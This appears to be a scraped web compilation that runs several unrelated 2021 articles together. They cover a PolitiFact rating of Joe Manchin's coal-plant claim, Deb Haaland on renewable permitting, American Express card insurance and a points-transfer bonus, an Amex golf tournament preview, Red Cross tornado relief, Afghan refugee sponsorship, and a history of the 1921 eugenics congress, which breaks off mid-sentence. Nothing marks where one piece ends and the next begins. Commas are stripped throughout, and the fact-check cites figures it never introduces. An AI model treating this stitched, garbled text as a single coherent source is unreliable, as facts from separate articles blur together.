How many coal-fired plants are there in the U.S.?

Manchin’s deputy press secretary Jeremy Ortiz told PolitiFact West Virginia that the senator was referring to coal plant data from the Global Energy Monitor a nonprofit group that tracks energy data. The group’s Global Coal Plant Tracker collects data on all coal-fired power plants that generate at least 30 megawatts of power.

Manchin’s figure for current coal-fired plants — 504 — is close to one of the figures in the Global Coal Plant Tracker database. However Manchin used the wrong terminology to describe this number.

Data from the tracker show that there are 498 coal-fired units in the U.S. and that’s not far from 504.

But notice what is being counted: units rather than ""plants"" which is the word Manchin used. The tracker’s database counts a much smaller number of coal-fired plants in the US. — 246.

So what’s the difference?

""​​Units often consist of a boiler and turbine and several units may make up one coal-fired power station"" said Flora Champenois a coal research analyst with the Global Energy Monitor. ""Interchanging the terms for plants and units is inaccurate."" For example she said the Clifty Creek station in Indiana is one power plant but it operates six units.

Has the U.S. been closing coal-fired power plants over the past decade?

U.S. coal capacity did peak a decade ago at around 340 gigawatts and has declined to 232 gigawatts today Champenois said. Low-carbon alternatives have increasingly become competitive with coal on price and the shift away from coal has been reinforced by increased attention among utilities governments and the public to carbon emissions’ role in driving climate change.

Champenois added that while the U.S. has been retiring coal-fired plants at a ""record pace"" it is not on track to meet the goals set by the Paris Agreement the global climate accord that the U.S. rejoined earlier this year.

Have other countries reduced their reliance on coal?

Champenois said that the U.S has retired more capacity measured in gigawatts than any other country since 2000 which supports Manchin’s assertion that no other country has reduced its reliance on coal for energy as much as the U.S. has.

But many other countries have been cutting back too.

China has retired a lot more coal-fired units than the U.S. has and many of the European Union’s 27 countries have retired a much larger percentage of their existing capacity Champenois said.

The EU has reduced coal consumption by half since 2015 Sean O’Leary senior researcher at the Ohio River Valley Institute told PolitiFact West Virginia

That said measuring the impact of these reductions in countries like China and India is tricky.

Despite the pace of coal-fired retirements China India and the rest of the world have also added coal-fired power units plants and capacity during the past decade producing net increases in all three metrics. By contrast the U.S. has seen decreases in all three.

China has been adding non-coal assets at a faster pace than it’s adding coal-fired assets meaning that coal’s share of its energy portfolio has been declining.

""Although China is increasing generation from coal coal's share of Chinese generation has been declining since 2010 and China has announced its intention to reduce coal-fired generation starting in 2026"" O’Leary said.

Despite the complexities of measuring the global changes in coal use O’Leary said that Manchin overstated how unusual the United States’ transition away from coal has been.

""The notion Manchin tried to convey that the U.S. is alone in cutting reliance on coal while the rest of the world bounds ahead is just plain wrong"" O’Leary said.

Our ruling

Manchin said the U.S. had 589 coal-fired plants 10 years ago and ""we're down to 504. … We are the only nation that has reduced our reliance as far as in coal energy.""

Manchin is broadly right to note that the U.S. has decreased its reliance on coal for generating electricity over the past decade although he incorrectly labeled the units of measurement that went along with his figures.

He also has a point that the U.S. has led the world in the number of retirements of coal-fired assets but it’s worth noting that the U.S. is not alone as other countries have also made significant cuts in coal-fired power over the same period.

We rate the statement Half True.

""The demand for renewable energy has never been greater"" she said at a sun-splashed outdoor press briefing at the Bureau of Land Management's Palm Springs office. ""The technological advances increased interest cost-effectiveness and tremendous economic potential make these projects a promising path for diversifying our energy portfolio.""

Haaland said the Department of Interior is working with states cities and tribes ""to meet our goal of permitting at least 25 gigawatts of onshore renewable energy by 2025.""

One gigawatt is roughly the size of two coal-fired power plants and can power 750000 homes. There are an estimated 97.2 gigawatts in operation in the U.S. currently according to the Department of Energy or enough to power 18 million homes.

Haaland along with other top federal officials sees using portions of vast federal lands to build new renewable energy as critical to cutting fossil fuel emissions slowing rapid climate change and boosting local economies. That includes across the Mojave and Sonoran deserts in select areas.

She said the Bureau of Land Management is currently processing 49 onshore clean energy projects proposed on public lands in the western United States including 36 solar projects four wind projects four geothermal projects and five interconnect ""gen tie"" lines that she said ""are vital"" to connect to clean energy projects proposed on non-federal land.

""These projects have the combined potential to add over 24500 megawatts of renewable energy to the western electric grid.""

A megawatt can power between 400 and 900 homes. The share of electricity from solar ""farms"" in the U.S. that use photovoltaic panels or concentrating solar thermal power technology is still small — just over 3% — but is growing according to the energy department.

Deflecting Concerns

Haaland didn't directly respond to a question about concerns from area environmentalists and some Native Americans about loss of critical habitat for species and possible destruction of sacred sites during construction of renewable energy facilities. Haaland who is the first Native American U.S. Cabinet member instead said the entire Biden administration not just her department has made it a top priority to consult with sovereign tribes early and often on major initiatives.

She said in her prepared remarks that ""at every step of the way"" on its renewable energy plans ""Interior will undertake ... broad engagement including fishermen outdoor enthusiasts sovereign tribal nations states territories local officials agricultural and forest land owners and others to ... reflect the priorities of every single community.""

That's a tall order. U.S. Rep. Raul Ruiz D-Palm Desert who was at Haaland's side on Saturday said that in California the Desert Renewable Energy Conservation Plan had been carefully hammered out during the Obama administration to ensure important areas and cultural artifacts were conserved while other areas are bulldozed and built on.

BLM California Director Karen Mouritsen said at the press event that possible refinements to the desert plan are being discussed with various groups to meet its aims. In the past for instance biologists have noted desert tortoises rare wild flowers or other species in areas slated for development while not seeing them in some areas conserved for them.

Ruiz sees solar and lithium projects as critical not just to the U.S. but to the region.

""It is our signature our competitive advantage to produce renewable energy"" he said. ""You can't talk about solar ... without talking about what we have going on in eastern Riverside County. The 36th district is a national leader in renewable energy in fact we produce more solar energy on federal land than any other congressional district in the country.""

Haaland and Ruiz also celebrated the recently enacted $1 trillion federal bipartisan infrastructure law saying it would help repair aging infrastructure get clean drinking water to children and others and modernize broadband and other critical systems.

Haaland deferred to top Interior department appointees when asked about continued drought and worsening shortages in the Colorado River system which provides water for eight Western states and Mexico.

Rural water districts in the Coachella and Imperial valleys hold senior rights to the water under a 1922 Colorado River compact and court case law but some say as interior secretary she or other officials at her direction could open up the compact for new negotiations or take other emergency action. Water experts say if she did districts that hold senior rights would probably take the matter all the way to the U.S. Supreme Court.

After the press event Haaland and Ruiz toured the 550-megawatt Desert Sunlight solar farm off Interstate 10 north of Desert Center and visited a natural resources conservation site managed by BLM near Corn Springs. The area was a major site for prehistoric Native American Indian groups. The petroglyphs at Corn Springs are considered one of the finest examples of rock art in the Colorado Desert covering a 10000 year span.

The desert stops are part of a multi-day swing by Haaland across the Southwest including attending the Western Governors Conference in Coronado on Thursday touring a Wilmington neighborhood hard hit by pollution from oil and gas extraction and diesel trucks speaking with Los Angeles Mayor Eric Garcetti about funds to plug abandoned old oil wells and now heading to Las Vegas for a major water conference.

Although perks like unparalleled airport lounge access an up to $200 annual airline credit up to $200 annual prepaid hotel statement credit and up to $200 annual Uber credit (for U.S. services) may seem like the most valuable benefits of The Platinum Card® from American Express there are a number of lesser-known perks the card offers. Among them are Premium Global Assist and trip insurance. (Enrollment required.)

These protections are separate from perks like baggage insurance — they assist with more severe issues like emergency medical transportation and unforeseen trip cancellations.

While most services the hotline coordinates for you are at your own expense there are some benefits available to Platinum and Centurion cardholders at no cost. They include emergency medical transportation and evacuation — if the Amex physician or local physician decides that it is medically necessary and advisable due to inadequacy of local facilities — and repatriation of mortal remains.

There are some important exclusions such as pre-existing conditions and refusal of permission by local authorities so you'll want to read the full terms and benefits guide (warning: PDF link) for your card. Also note that the coverage is only for the cost of evacuation not the actual medical care.

What's covered by trip insurance?

Amex offers two types of trip insurance benefits: trip delay insurance and trip cancellation and interruption insurance. They're pretty self-explanatory but here's what you need to know.

With the trip delay insurance provided by the cards listed above you'll be reimbursed for unexpected expenses — such as meals lodging and personal-use items — if your trip is delayed by more than six hours due to a covered reason. You're covered up to $500 per trip so long as you booked round-trip flights and paid entirely with an eligible card (if you paid taxes and fees on award tickets or Pay With Points tickets that is also covered).

Amex defines round-trip tickets as travel consisting of ""roundtrip one-way or combinations of roundtrip or one-way tickets."" So for example an itinerary bringing a covered traveler from New York to Los Angeles then back from San Francisco to New York would qualify.

Some of Amex's mid-tier cards offer trip delay protection as well but only for delays of more than 12 hours with reimbursement of only up to $300.

On the other hand trip cancellation and interruption insurance provide reimbursement for covered expenses when you are forced to cancel or cut a covered trip short for an eligible reason. If you qualify you may receive reimbursement of non-refundable travel expenses of up to $10000 per trip with a maximum of up to $20000 per eligible account for each consecutive 12-month period.

Covered reasons for canceled trips include inclement weather terrorist action call to jury duty or sudden illness or injury to you or an eligible traveler. Again you must book ""round-trip"" travel paid for entirely using your eligible card to be covered.

Here's a sampling of what's not covered by trip cancellation/interruption insurance. Notably avoiding outbreaks generally isn't covered. You'll likely only get coverage in connection with COVID-19 if you contract the virus or a physician requires you to quarantine for health reasons related to COVID-19 on or before the departure of your trip.

Pre-existing conditions.

The eligible traveler's suicide attempted suicide or intentionally self-inflicted injury.

A declared or undeclared war.

Mental or emotional disorders unless hospitalized.

The eligible traveler's participation in a sporting activity for which he or she receives a salary or prize money.

The eligible traveler being intoxicated at the time of an accident. Intoxication is defined by the laws of the jurisdiction where such accident occurs.

The eligible traveler being under the influence of any narcotic or other controlled substance at the time of an accident unless the narcotic or other controlled substance is taken and used as prescribed by a physician.

The eligible traveler's commission or attempted commission of any illegal or criminal act including but not limited to any felony.

The eligible traveler parachuting from an aircraft.

The eligible traveler engaging or participating in a motorized vehicular race or speed contest.

Dental treatment except as a result of accidental bodily injury to sound natural teeth.

Any non-emergency treatment or surgery along with any routine physical examinations.

Hearing aids eye glasses or contact lenses.

One-way travel that does not have a return destination.

A counterfeit scheduled airline or train ticket or a scheduled airline or train ticket which is charged to a fraudulently issued or fraudulently used eligible card.

Any occurrence while the eligible traveler is incarcerated.

Loss due to intentional acts by the eligible traveler.

Financial insolvency of a travel agency tour operator or travel supplier.

Any expenses that are not authorized and reimbursable by the eligible traveler's employer if the eligible traveler makes the purchases with a commercial card.

For all the appeal of concerts and non-golf activities at tournaments these days including The American Express the PGA Tour’s greatest appeal is the star power of its golfers. What a leader board looks like on Sunday afternoon does as much to elevate a tournament in the eyes of the golf world as anything else that happens tournament week.

Officials at The American Express tournament didn’t confirm many names for the 2022 event during their media day Thursday at PGA West in La Quinta but what the tournament did say holds great promise for the event just six weeks away.

That starts with the tournament host who also just happens to be the reigning PGA Championship winner Phil Mickelson. Mickelson’s PGA win in May at Kiawah Island might have been the highlight of the year and since then he has continued to win just on the PGA Tour Champions rather than the PGA Tour itself. But a major champion in the field of the desert event is always a boost. Mickelson is also No. 36 in the world rankings.

More:2022 American Express golf event will feature return of fans top golfers Phil Mickelson Tony Finau

More:Could Ben Hogan's limited schedule spark Tiger Woods' return to competitive golf?

Two other players announced were Scottie Scheffler and Tony Finau. Both were members of the victorious U.S Ryder Cup team and they are 11th and 12th in the Official World Golf Rankings respectively. It doesn’t seem that long ago that the desert’s PGA Tour event struggled to get anyone in the top 30 in the rankings to play so having two players in the top 12 already in the field shows the tournament’s field continues to improve.

And of course there is the defending champion Si Woo Kim who held off a charging Patrick Cantlay last year for a one-shot win. Cantlay shot 61 in the final round on the Stadium Course at PGA West but Kim made birdies on the 16th and 17th holes for his third PGA Tour victory.

While that’s all that tournament officials could say this week they expect more big names in the coming days and weeks. Speculation will center around two players world No. 1 Jon Rahm and the reigning FedEx Cup champion and player of the year Patrick Cantlay. Cantlay certainly played well enough to win the event last year and and also posted a top-10 finish in the desert in 2019.

Who will be added?

Rahm won the tournament in 2018 and was sixth in 2019. He was entered in last January’s field but withdrew the week of the tournament when he tweaked a muscle in a workout session days earlier. Rahm is certainly a name the tournament believes will play this year and would be a major addition to the event.

One question fans ask is who would they like to see in the tournament who has never played in the event before. With so many opportunities for players regular season events like The American Express can’t attract every player. Certainly players like Collin Morikawa and Viktor Hovland two top young players both in the top 10 in the world rankings would be players any tournament would want. But there are no guarantees or even hints yet that those players could commit to play in the desert.

Every tournament has its wish list for players and there is no way for a tournament to assure any of those players show up at the event. The American Express is fortunate that players like Finau and Paul Casey have relationships with American Express and that tournament operator SportFive has representation deals with players like Mickelson and Rahm. Not every player in a 156-player field will be star caliber and some will be golfers who fans haven’t heard of from the Korn Ferry Tour.

Filling a tournament field can be almost a matter of luck as much as it is hard work by tournament staff. The 2022 American Express is starting with a strong core of players for its field with more big names on the way. For a tournament that 10 years ago struggled to get any big names in the field that’s a pretty good start for January's tournament.

I had to log in to see it so it may be targeted but it does seem to be fairly broadly targeted.

Last month Singapore offered up to a 15% bonus on transfers from several partners. However transfer bonuses into Singapore Airlines have been exceptionally rare.

There are two reasons to do this:



Through February 2022 there’s a promotion where transferring points into 250000 KrisFlyer miles will earn Star Alliance Gold status.

Singapore Airlines generally restricts long haul business and first class award space on their own flights to their own members. You can’t book long haul premium cabin travel on Singapore Airlines using United miles in nearly all cases.

There are also reasons not to do this.

Transfers that are speculative – you don’t know how you’ll use the points or when – mean giving up the flexibility of being able to move the points somewhere else. There’s huge option value in transferable points you give up when you transfer.

Singapore miles expire 3 years after being earned. It’s not 3 years of inactivity in an account – each mile has three years to be used.

We’re in uncertain times and while it’s possible for some Americans to travel to Singapore now it depends on where you were vaccinated whether you can produce the required proof. Much of Asia is not yet open to Americans though some places like Thailand are with hoops to jump through.

Oddly there’s no published end date for the offer. Bear in mind that transfers generally take 12 hours to 3 days.

Amex to KrisFlyer 20% transfer bonus

The US American Express Membership Rewards program seems to be offering a 20% bonus when you transfer points to Singapore Airlines KrisFlyer. That means that Amex points transfer to KrisFlyer at a 1000:1200 ratio.

Note that:

This promotion may be targeted though it at least seems to be pretty widely targeted

There’s no published end date for the offer and it’s noted that “if you return to redeem points later this offer may no longer be available”

I wouldn’t be surprised to see this offer available until the end of the year but we certainly can’t count on it. I’d recommend taking advantage of this sooner rather than later if interested.

There are lots of great cards earning Amex Membership Rewards points so I imagine this offer could be interesting to many. Amex Membership points transfers to Singapore KrisFlyer generally aren’t instant and can take up to two days.

Stack this with KrisFlyer Star Alliance Gold promotion

The Singapore Airlines KrisFlyer program is running another lucrative promotion and the two offers can be stacked. Through February 28 2022 you can earn KrisFlyer Elite Gold status if you transfer 250000 points to the KrisFlyer program from a partner.

This unlocks Star Alliance Gold status which offers perks across Star Alliance airlines including priority check-in lounge access priority boarding and much more. Being able to earn a 20% bonus on points transfers plus getting Star Alliance Gold status is a pretty awesome combo.

Should you transfer points to Singapore KrisFlyer?

There are three major reasons to consider taking advantage of this promotion:

Bonuses like this have historically been rare; we’ve seen transfer bonuses a couple of times in recent months but pre-pandemic we just about never saw a bonus from a transferable points currency

Not only is there a transfer bonus but you can stack this with a promotion that will earn you Star Alliance Gold status

Singapore Airlines primarily restricts premium cabin long haul award space to members of its own KrisFlyer program so if you want to redeem for these products this is your best bet

Singapore Airlines Lounge London Heathrow

That being said there are also reasons not to take advantage of this promotion:

While Singapore is starting to reopen with the “Vaccinated Travel Lane” concept that’s still a long shot from a full reopening and it’s anyone’s guess when Singapore will open on a more flexible basis

Historically KrisFlyer miles expire 36 months after they’re earned regardless of any qualifying activity so you can’t just keep these miles forever

The beauty of transferable points currencies is the flexibility that they offer you and you lose all that flexibility when you transfer them to one particular partner

Singapore Airlines’ A330 business class

Personally I think this promotion is pretty tempting especially as it comes at a time when global travel is slowly starting to open up again and on top of that there are two offers to stack here. Getting a 20% bonus plus Star Alliance Gold status could represent a great deal.

You don’t have to travel to Singapore to maximize your KrisFlyer miles. Singapore Airlines also has fifth freedom flights from New York to Frankfurt and from Houston to Manchester for example. Singapore Airlines’ 777 first class

Bottom line

Amex Membership Rewards is offering a 20% bonus when you convert points into Singapore KrisFlyer miles. There’s no published end date and it’s possible this offer is targeted though it’s at least pretty widely targeted.

The American Red Cross and our partners are working around the clock across multiple states to help those in need and make sure everyone has a safe place to stay food to eat critical relief supplies emotional support and comfort in the face of one of the most devastating tornado outbreaks in years.



At least 24 tornadoes ripped across six states in the dark of night impacting people in Arkansas Illinois Indiana Kentucky Missouri and Tennessee. Initial reports show that some communities have suffered significant damage with homes and buildings destroyed and hundreds of thousands of people left without power.



Several emergency shelters are open to provide comfort for people who can’t return home. As the weather clears Red Cross volunteers will be out in affected communities assessing the damage left behind to help determine the types of support people may need in the coming days and weeks.



THREAT NOT OVER The National Weather Service reports the severe weather continues today from the Ohio and Tennessee valleys to the northern Gulf States. As Red Cross workers respond to last night’s tornadoes we urge everyone who remains in the path of this ongoing severe weather system to listen to the advice of local officials and be ready to get to a safe place quickly in case of a tornado warning. Download the free Red Cross Emergency app for access to real-time information and safety tips. The Emergency app is available in app stores by searching for the American Red Cross or going to redcross.org/apps.



PLEASE GIVE BLOOD The Red Cross has provided more than 160 blood products to hospitals in response to these devastating tornadoes. We remain in touch with our hospital partners throughout affected areas and stand ready to provide additional blood products as needed. We also anticipate Red Cross blood drives in affected communities may be canceled or experience lower donor turnout in the coming days further challenging an already historically low blood supply.



YOU CAN HELP people affected by disasters like storms home fires and countless other crises by making a gift to Red Cross Disaster Relief. Those in areas unaffected by this tornado outbreak are urged to make an appointment today to give blood and ensure blood products are available for patients wherever the need arises.



Your donation is a commitment to helping people in need and every single contribution matters enabling the Red Cross to prepare for respond to and help people recover from disasters big and small. To make a financial donation or schedule an appointment to give blood or platelets visit redcross.org or call 800-RED CROSS. You can also use the Red Cross Blood Donor app or text the word REDCROSS to 90999 to make a $10 gift today.



CONNECT WITH A LOVED ONE If you are unable to locate someone who has been impacted by the storms call during off-peak hours for the best chance of getting through. Send a text message which may go through when phone calls cannot. You can also check your loved one’s social media pages or send an email. Call friends and relatives who may have already been in contact with your loved one or call people and places where your loved one is well-known; neighbors employer school place of worship senior center social club/center union or fraternal organization.



If your missing loved one is elderly has a functional or access needs suffers from a medical or mental condition or has difficulty understanding the English language you can reach out to your local Red Cross for assistance. If you lived with your missing loved one in the same home prior to the disaster but became separated or they are a member of the military community please reach out to your local Red Cross chapter for assistance.



AFTER A TORNADO (More tornado safety information available here.) Return to your neighborhood only when officials say it is safe to do so.

Keep children and pets away from hazardous sites and floodwaters.

If you have children leave them with a relative or friend while you conduct the first inspection of your home after the disaster.

Check the outside of your home before you enter. Look for loose power lines broken or damaged gas lines foundation cracks missing support beams and other damage. Ask a building inspector or contractor to check the structure before you enter.

If power lines are down outside your home don't step in puddles or standing water. Report them immediately to the power company.

Don't cut or walk past colored tape that was placed over doors or windows to mark damaged areas unless you've been told that it is safe to do so. If a building inspector has placed a color-coded sign on the home don't enter until you get more information advice and instructions from your local authorities.

If you smell gas or hear a hissing noise leave the property immediately and get far away from it. Call the fire department after you reach safety.

IF YOUR POWER IS OUT (More power outage safety information can be found here.). There are ways that you can minimize loss and keep everyone as comfortable as possible.

Use flashlights in the dark — not candles.

Don’t drive unless necessary. Traffic lights will be out and roads could be congested.

Turn off and unplug any appliances equipment and electronics. When the power comes back on surges or spikes can damage equipment.

Leave one light on so you’ll know when power is restored.

If a power outage is two hours or less don’t be concerned about losing perishable foods. During a prolonged outage keep refrigerator and freezer doors closed as much as possible to protect your food.

Use perishable food from the refrigerator first. Then use food from the freezer.

Perishable food is safe to eat when it has a temperature of 40 degrees Fahrenheit or below.

If the power outage will continue beyond a day prepare a cooler with ice for your freezer items. Keep food in a dry cool spot and cover it at all times.

If you are using a generator keep it dry and don’t use it in wet conditions.

Never use a generator grill camp stove or other gasoline propane natural gas or charcoal-burning device inside a home garage basement or other partially enclosed area. Keep this equipment outside and away from doors windows and vents which could allow carbon monoxide to come indoors.

Operate the generator on a dry surface under an open canopy-like structure such as under a tarp held up by poles. Don’t touch a generator with wet hands.

Turn the generator off and let it cool down before refueling. Gasoline spilled on hot engine parts could catch fire.

Plug appliances directly into the generator. Never plug a generator into a wall outlet.

COVID-19 has not changed the Red Cross mission. We are providing the same types of support we always have and ensuring people have a safe place to stay during disasters is a critical part of that support. How we support sheltering efforts may be different in each community depending on local emergency plans and the scale of the disaster.

Responding to disasters is a team effort and no single organization can do it alone — particularly in this current environment. To help keep everyone safe we’re using safety precautions including masks health screenings enhanced cleaning procedures and encouraging social distancing regardless of vaccine status.



The Red Cross helps anyone in need after a disaster and everyone is welcome in our shelters. We encourage people who plan to stay in a Red Cross shelter to bring prescription medications extra clothing pillows blankets hygiene supplies other comfort items and important documents. Don’t forget to bring any special items for children such as diapers formula and toys or for family members who have unique needs.

Managing the large-scale rapid evacuation of more than 60000 Afghans has pushed the federal government and private sector to innovate by expanding community-based refugee resettlement and creating a private sponsorship program. This new civic initiative has the potential to dramatically reshape how refugees are resettled in the United States but will need additional resources and new legislation to flourish.

President Joe Biden campaigned to rebuild the United States’ system of resettling refugees the US Refugee Admissions Program (USRAP) which had been severely undermined by the Trump administration. Under Trump refugee admissions to the United States languished precisely as global forced migration reached unprecedented levels. Contrasting his predecessor Biden’s plan was to restore the United States’ reputation as a global leader in supporting refugees both through increased domestic resettlement and expanded humanitarian aid abroad. With more than eighty million people worldwide displaced by political violence persecution and climate change this commitment is urgently needed.

The administration’s aim to “rebuild and enhance” the refugee program was detailed in a White House “Executive Order on Rebuilding and Enhancing Programs to Resettle Refugees and Planning for the Impact of Climate” in February 2021. Noting the importance of a timely admissions process and the emerging challenge of climate refugees the plan described expanded support for community sponsorship of refugees including a new private sponsorship program. Seeking to promote “innovation” and greater civic engagement these new initiatives have the potential to dramatically reshape how refugees are resettled in the United States.

Historically US refugee resettlement has been carried out by federally funded private sector resettlement agencies such as the International Rescue Committee Church World Service and Hebrew Immigrant Aid Society. In our research examining the role of volunteers in US refugee resettlement we have identified a shift to greater autonomy and participation by community members through co-sponsorship of refugee families. This entails assuming the traditional role of resettlement organizations in facilitating refugee integration in local communities. As a result of this development public support for refugees has grown. Just as important community sponsorship has created new community-level and cross-community relationships. Yet as more dispersed and often less experienced groups assume responsibility for welcoming refugees into US communities understanding the potential benefits and challenges of this policy shift is essential.

Until the withdrawal of military forces and civilian actors from Afghanistan in late summer 2021 Biden appeared reluctant to substantively increase refugee resettlement to the United States. In part this reflected his concern that growing numbers of migrants and asylum seekers at the US-Mexico border had diminished the capacity to scale up USRAP as originally promised. Indeed in April 2021 Biden announced he would keep the Trump era cap of refugee admissions at 15000 in fiscal year 2022—a record low ceiling for annual admissions. However faced with public perceptions that the exit from Afghanistan was ill-planned and put thousands of civilians at risk the administration reversed course and announced a plan for local communities to become centrally involved in resettling Afghan evacuees. In addition Biden declared in early October 2021 that up to 125000 refugees would be resettled this fiscal year.

By September 2021 the administration was temporarily housing more than 50000 Afghans on military bases in the United States. Those granted Special Immigrant Visa (SIV) status prior to the US military withdrawal in Afghanistan were permitted to settle in local communities. Most Afghans brought to the United States do not have SIV status however and therefore must wait on US bases while their cases are processed and security and medical clearances are vetted. They have been accorded “humanitarian parole” status which does not automatically afford them opportunities to work or be granted an immediate pathway to permanent residency in the United States. Thus as the government prepares to place these Afghans in communities across the country thousands of community volunteers are needed to assume the traditional role played by resettlement organizations.

In this context the administration launched Operation Allies Welcome which created a new Sponsor Circle Program for Afghan evacuees to the United States through a private sector initiative launched in 2021 known as the Community Sponsorship Hub (CSH). The CSH is a collaboration between the federal government and influential philanthropic actors including Open Society Foundations Shapiro Foundations and G. Barrie Landry and Laurie T. Franz. Run by Rockefeller Philanthropy Advisers Incorporated the program aims to coordinate large-scale community-level voluntarism and private philanthropic support for Afghan evacuees and other refugees resettling in the United States. CSH is an outgrowth of the State Department’s effort to partner with private sector leaders and organizations through Welcome.US which is “mobilizing the American public” to support Afghans.

As Secretary of State Antony Blinken noted in an October 25 press release the Sponsor Circle Program “harnesses this outpouring of support and enables individuals to become directly involved in the welcome and integration of our new neighbors.” The initiative prioritizes communities as key actors in supporting Afghan refugees expanding US resettlement capacity in conjunction with non-profit resettlement agencies. For Blinken the program “showcases the powerful role that individuals can play in coming together to welcome and integrate Afghans into American society reflecting our spirit of goodwill and generosity.”

The Sponsor Circle Program reflects a novel departure from past community sponsorship practices where resettlement agencies and their local affiliates coordinated the resettlement of refugees with local volunteer groups. Sponsor Circles modeled in part on the Canadian “Group of Five” program allows as few as five individuals eighteen and older to create a “certified sponsor circle” and take responsibility for resettling an Afghan family or individual. Each circle must raise $2275 for each Afghan evacuee and commit to “finding initial housing stocking the pantry connecting children to school providing initial income support and helping adults to find employment.” In addition the recent “Afghanistan Supplemental Appropriations Act 2022” provides Afghan evacuees with the same resources as those who are resettled through the refugee and SIV programs.

There are numerous benefits to community and private sponsorship of refugees. Fundamentally Biden’s initiatives will create greater capacity to resettle refugees and expand the ways in which this occurs. Thus this program appears to demonstrate a long-term commitment to increase the number of refugees resettled in the United States each year responding to calls from refugee rights advocates. Doing so can help reverse the effects of the Trump administration’s efforts to dismantle the refugee resettlement program and reflect a renewed US commitment to leadership on this issue.

Community sponsorship also encourages local residents to “invest” in welcoming refugees. Under existing community sponsorship efforts volunteers often have deep ties to their local communities—critical for helping refugees secure housing and gain access to employment education and health care. As these programs expand efforts to connect refugees to community institutions and stakeholders which are crucial to help facilitate their social integration may be enhanced. As Chris George Executive Director of Integrated Refugee and Immigrant Services in New Haven Connecticut has observed “It’s better for the refugee family to have a community group working with them that knows the schools and knows where to shop and knows where the jobs are.”

As more local communities take responsibility for sponsoring refugee families the potential for a more durable resettlement program may be enhanced. In the face of heightened polarization of refugee and immigration policies community sponsorship programs can also foster broad-based involvement in refugee resettlement. In turn greater levels of community engagement can help challenge opposition toward and misinformation about refugees and create greater public support for the idea of refugee resettlement.

Yet these efforts are also fraught with significant challenges. Sponsor circle members may have limited capacity or skills to navigate the social welfare system access health care services or secure affordable housing for refugees. If group members lack familiarity with the intricacies of US immigration law helping Afghans designated as “humanitarian parolees” attain asylum status may prove daunting. Without adequate training and ongoing support from resettlement agencies and caseworkers community volunteers may experience “burn out” from these various responsibilities.

Finally “successful” private and community sponsorship efforts risk providing justification to the arguments of those in support of the privatization of the USRAP and who claim that the government’s role in resettlement should be limited. Opponents of refugee resettlement could argue that community groups are more effective than the existing public–private resettlement model and seek to cut federal funding and involvement in resettlement. Such action could ultimately limit the overall number of refugees the United States admits in the future.

Managing large-scale rapid evacuation and temporary housing of more than 60000 Afghans has pushed the federal government and the private sector to create innovative ways to support refugees. Community and private sponsorship approaches to refugee resettlement have the potential to expand and dramatically transform the forty-year-old US Refugee Admissions Program. For these programs to flourish however additional resources and a long-term commitment to community and private sponsorship in addition to the existing refugee program are needed. Developing supports for those involved in private sponsorship particularly in communities with limited organizational capacity and experience resettling refugees is critical. Substantive training of volunteers and community groups by professional resettlement agencies is also vital to assure the efficacy and sustainability of community-driven refugee resettlement. Beyond initial preparation however ongoing support by resettlement professionals to ensure that refugees access social services and legal resources as well as help address inevitable challenges that arise for volunteers will be necessary for the success of this new civic initiative. One way to help ensure this occurs is through new legislation to institutionalize private sponsorship of refugees as part of the existing resettlement program. Bipartisan support for such a plan would signal that the United States is ready to reestablish its role as a global leader in defense of persecuted vulnerable and displaced populations.

The Eugenics Movement in Retrospect Despite warnings by biologists and geneticists eminent individuals and venerable institutions helped promote a false theory that led to sterilizations and genocide.

AMNH

One hundred years ago the Second International Congress of Eugenics was held from September 22-28 1921 at the American Museum of Natural History (AMNH) in New York City. The assembly opened to enthusiastic fanfare and positive media attention. Alexander Graham Bell (1847-1922) was the honorary president. On the first evening paleontologist and museum president Henry Fairfield Osborn (1857-1935) opened the scientific portion of the Congress with a welcoming address that set a hopeful tone for the meeting—one of discovery and high-quality scientific presentations. Science magazine printed the address in its entirety. In a paper published in The Eugenics Review Clarence Cook Little (1888-1971) then at the Carnegie Institution of Washington summarized the goals of the meeting and the speaking schedules.

The Second Congress had four sections entitled “Human and Comparative Heredity” “Eugenics and the Family” “Human Racial Differences” and “Eugenics and the State.” AMNH mounted an exhibition for the event called the “Exhibition of Eugenics.” Henry Hamilton Laughlin (1880-1943) superintendent of the Eugenics Record Office at the Cold Spring Harbor Laboratory on Long Island NY edited a book-size account of the 131 exhibits presented at the meeting. Laughlin was also the expert eugenic agent for the Committee on Immigration and Naturalization for the U.S. House of Representatives from 1921-31. This congressional committee was responsible for among other things the Johnson-Reed Act of 1924 which set immigration quotas and had the net effect of limiting the number of Jews who could immigrate to the United States in the 1930s from Nazi-controlled Germany.

Natural History covered the Second Congress in the September-October 1921 issue in an article entitled “Personnel of the Second International Congress of Eugenics.” The magazine reported that the event “was exceptionally well attended by scientists from all parts of the world. Many foreign societies and universities were represented by delegates especially designated and in addition no less than sixteen governments appointed representatives…Four delegates were sent by the United States Public Health Service and eleven…states had present delegates who had been appointed for the purpose by the respective governors of those states.”

 admission was through the southern entrance on 77th Street. Registration was in what is now known as the museum’s Grand Gallery. The old Forestry Hall to the right of this gallery was where many of the exhibits submitted for the meeting were displayed. On the fourth floor was the main eugenics exhibition where most of the talks were given—in the Hall of the Age of Man (opened in 1911 and closed in 1965). With its description of early man and fossil evidence about early humans this hall set the evolutionary context for the forum. Two of the Charles Knight (1874-1953) murals that were installed in the Hall of the Age of Man can still be seen in the stairway that participants traversed. These murals were part of the science of paleontological reconstruction demonstrated in the Hall of the Age of Man.

Osborn’s address was followed by a talk by Major Leonard Darwin (1850-1943)—son of Charles Darwin. The evening was completed by an address by the founder of the Eugenics Record Office biologist Charles B. Davenport (1866-1944)—an eminent supporter of Mendelian genetics and of eugenics. Davenport also edited a volume published in 1923 that bundled fifty-three of the major addresses at the meeting including the opening evening’s three addresses. Darwin’s address: “The Aims and Methods of Eugenical Societies” was also published in Science in 1921. The Little Laughlin and Davenport accounts provide an overarching view of the proceedings of the forum.C. C. Little reported the reasoning for the Second Congress’s existence and some goals that were established to offset resistance from opponents of eugenics. He mentioned three kinds of criticism of eugenics lodged prior to this second international meeting. Criticism from scientists studying biology and genetics had vociferously pointed out that “eugenists knew too little of the foundation of their science”—eugenicists were creating an endeavor without a scientific base despite the earlier work of polymath Francis Galton (1822-1911) and mathematician Karl Pearson (1857-1936) who had attempted to infuse statistics and numerical examples into the inferences made by eugenics. The second criticism concerned the extreme recommendations that eugenicists were making that flew in the face of tradition not only in the context of society but in the way that eugenics approved of non-traditional relationships between the sexes that were “widely divergent from those at present existing.” The third criticism came from the public which derided eugenicists as “faddists”—eugenics was a “gigantic joke” best ignored. For eugenics to become a full-fledged discipline the public perception of eugenics needed to be corrected. And the organizing committee reasoned that AMNH because of its educational and 